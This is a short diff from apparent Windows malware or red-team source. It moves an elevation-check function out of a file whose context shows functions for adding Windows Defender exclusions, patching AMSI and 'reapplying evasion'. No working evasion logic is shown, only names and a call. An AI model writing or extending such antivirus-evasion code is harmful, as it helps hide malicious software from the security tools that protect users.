@@ -31,19 +31,7 @@ BOOL AddDefenderExclusion(const wchar_t* exePath) {
     return FALSE;
 }
 
-BOOL IsElevated() {
-    HANDLE hToken;
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
-        return FALSE;
-    TOKEN_ELEVATION te;
-    DWORD retLen;
-    BOOL result = FALSE;
-    if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &retLen)) {
-        result = te.TokenIsElevated;
-    }
-    CloseHandle(hToken);
-    return result;
-}
+// IsElevated() is defined in utils.cpp — use via #include "utils.hpp"
 
 VOID ReapplyEvasion() {
     PatchAMSI();
